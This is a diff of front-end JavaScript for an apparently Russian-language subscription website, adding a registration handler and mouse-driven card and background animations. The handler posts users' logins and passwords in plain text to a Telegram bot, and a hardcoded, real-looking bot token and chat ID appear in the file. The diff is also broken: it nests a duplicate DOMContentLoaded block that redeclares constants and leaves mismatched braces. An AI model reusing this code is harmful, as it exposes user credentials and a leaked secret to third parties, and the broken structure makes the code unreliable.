@@ -6,6 +6,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const TG_BOT_TOKEN = '8295559037:AAHQquYCqOdD9nGofg65ibGOmvLjYlR4QiA'; // Например: '700123456:AAHi...'
     const TG_CHAT_ID = '5683927471';     // Например: '987654321'
 
+document.addEventListener('DOMContentLoaded', () => {
+
+    // ==========================================
+    // ⚙️ НАСТРОЙКИ (ВВЕДИТЕ СВОИ ДАННЫЕ!)
+    // ==========================================
+    const TG_BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'; // <-- ВСТАВЬТЕ СЮДА ВАШ ТОКЕН
+    const TG_CHAT_ID = 'ВАШ_CHAT_ID';     // <-- ВСТАВЬТЕ СЮДА ВАШ CHAT ID
+    
     // ВРЕМЯ ЖИЗНИ ПОДПИСКИ В МИЛЛИСЕКУНДАХ
     // 60000 = 1 минута (для теста). Для 30 дней поставьте: 2592000000
     const SUBSCRIPTION_DURATION = 60000; 
@@ -233,4 +241,58 @@ document.addEventListener('DOMContentLoaded', () => {
             btn.disabled = true;
             btn.textContent = '...';
             const message = `🔔 <b>Новая заявка!</b>\n\n👤 <b>Логин:</b> ${login}\n🔑 <b>Пароль:</b> ${pass}`;
-            fetch(
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'HTML' }) })
+            .then(response => { if (response.ok) { alert(translations[currentLang].regSuccess); regModal.classList.add('hidden'); regForm.reset(); } else { console.error('Ошибка Telegram:', response); alert(translations[currentLang].regError); } })
+            .catch(error => { console.error('Ошибка сети:', error); alert(translations[currentLang].regError); })
+            .finally(() => { btn.disabled = false; btn.textContent = originalText; });
+        });
+    }
+
+    hamburgerBtn.addEventListener('click', (e) => { e.stopPropagation(); mainMenu.classList.toggle('hidden'); });
+    if(menuLoginBtn) menuLoginBtn.addEventListener('click', () => { authModal.classList.remove('hidden'); mainMenu.classList.add('hidden'); });
+    if(menuRegisterBtn) menuRegisterBtn.addEventListener('click', () => { regModal.classList.remove('hidden'); mainMenu.classList.add('hidden'); });
+    document.querySelectorAll('.close, .close-reg, .close-payment, .close-library').forEach(btn => {
+        btn.addEventListener('click', () => {
+            authModal.classList.add('hidden');
+            regModal.classList.add('hidden');
+            paymentModal.classList.add('hidden');
+            libraryModal.classList.add('hidden');
+        });
+    });
+
+    // ==========================================================
+    // 💎 PREMIUM DESIGN SCRIPTS (АНИМАЦИЯ ФОНА И КАРТОЧЕК)
+    // ==========================================================
+    const auroraContainer = document.querySelector('.background-glow');
+    if (auroraContainer) {
+        const aurora1 = auroraContainer.querySelector('.aurora.one');
+        const aurora2 = auroraContainer.querySelector('.aurora.two');
+        document.addEventListener('mousemove', (e) => {
+            const { clientX, clientY } = e;
+            const x = clientX / window.innerWidth;
+            const y = clientY / window.innerHeight;
+            aurora1.style.transform = `translate(${x * 80 - 40}%, ${y * 80 - 40}%)`;
+            aurora2.style.transform = `translate(${x * -80 + 40}%, ${y * -80 + 40}%)`;
+        });
+    }
+
+    function apply3DEffect() {
+        const cards = document.querySelectorAll('.card');
+        cards.forEach(card => {
+            card.addEventListener('mousemove', (e) => {
+                const rect = card.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                const rotateX = (y / rect.height - 0.5) * -15;
+                const rotateY = (x / rect.width - 0.5) * 15;
+                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.05, 1.05, 1.05)`;
+            });
+            card.addEventListener('mouseleave', () => {
+                card.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
+            });
+        });
+    }
+
+    // --- ПЕРВЫЙ ЗАПУСК ---
+    updateAuthUI();
+});```
